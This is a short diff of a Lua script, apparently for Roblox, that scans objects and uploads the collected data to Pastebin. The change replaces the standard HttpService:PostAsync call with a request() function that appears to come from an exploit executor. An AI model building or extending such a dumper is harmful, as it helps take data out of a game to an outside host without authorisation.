@@ -149,7 +149,7 @@ local function scanObject(obj, path, depth)
     return data
 end
 
--- Function to send data to Pastebin
+-- Function to send data to Pastebin using webhook-style request
 local function sendToPastebin(data)
     local success, result = pcall(function()
         local postData = {
@@ -162,8 +162,17 @@ local function sendToPastebin(data)
             api_paste_expire_date = "1M" -- Expires in 1 month
         }
 
-        local response = HttpService:PostAsync(PASTEBIN_API_URL, HttpService:UrlEncode(postData))
-        return response
+        -- Use webhook-style request instead of HttpService:PostAsync
+        local response = request({
+            Url = PASTEBIN_API_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/x-www-form-urlencoded"
+            },
+            Body = HttpService:UrlEncode(postData)
+        })
+
+        return response.Body
     end)
 
     if success then
